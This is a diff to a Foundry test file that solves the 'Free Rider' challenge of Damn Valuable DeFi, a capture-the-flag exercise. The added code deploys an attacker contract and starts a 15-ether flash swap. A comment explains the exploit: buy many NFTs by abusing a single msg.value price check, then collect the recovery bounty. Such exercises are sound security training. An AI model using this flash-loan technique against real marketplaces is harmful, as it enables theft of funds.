@@ -11,6 +11,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {FreeRiderAttacker} from "../../src/free-rider/FreeRiderAttacker.sol";
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -123,7 +124,21 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        //initialize attacker
+        FreeRiderAttacker attacker = new FreeRiderAttacker(
+            address(uniswapV2Factory), address(token), address(weth), address(recoveryManager), marketplace, nft
+        );
+
+        // get weth
+        weth.deposit{value: 0.05 ether}();
+
+        // Approve flash swap fee aprox
+        weth.approve(address(attacker), 0.05 ether);
+
+        // flash swap of 15 ether and use it to buy many nfts (checks msg.value with same price always)
+        // then safe transfer nfts to recovery manager and get bounty
+        uint256 amountToBorrow = 15 ether;
+        attacker.flashSwap(amountToBorrow);
     }
 
     /**
